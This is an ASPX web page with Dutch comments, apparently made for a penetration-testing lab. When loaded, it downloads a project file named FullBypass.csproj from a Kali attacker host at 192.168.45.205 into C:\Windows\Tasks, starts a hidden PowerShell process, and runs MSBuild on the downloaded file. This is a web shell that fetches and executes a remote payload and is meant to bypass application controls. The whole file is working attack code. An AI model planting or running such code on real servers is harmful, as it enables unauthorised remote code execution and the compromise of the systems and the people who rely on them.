<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head>
    <title>ASPX Spawn PowerShell + MSBuild</title>
</head>
<body>
    <h1>ASPX Combined Execution</h1>
    <pre>
<%
    try
    {
        // 1. Download .proj vanaf Kali
        string url = "http://192.168.45.205:8000/FullBypass.csproj";
        string localPath = "C:\\Windows\\Tasks\\FullBypass.csproj";

        using (var client = new System.Net.WebClient())
        {
            client.DownloadFile(url, localPath);
        }

        // 2. Start een PowerShell proces (op de achtergrond, zodat MSBuild iets vindt)
        var ps = new System.Diagnostics.Process();
        ps.StartInfo.FileName = "powershell.exe";
        ps.StartInfo.Arguments = "-NoProfile -WindowStyle Hidden";
        ps.StartInfo.UseShellExecute = false;
        ps.Start();

        System.Threading.Thread.Sleep(2000); // kleine delay zodat PS zeker draait

        // 3. Start MSBuild met je .proj
        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe";
        p.StartInfo.Arguments = "\"" + localPath + "\"";
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();

        string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        p.WaitForExit();

        Response.Write(output);
    }
    catch (Exception ex)
    {
        Response.Write("Error: " + ex.ToString());
    }
%>
    </pre>
</body>
</html>
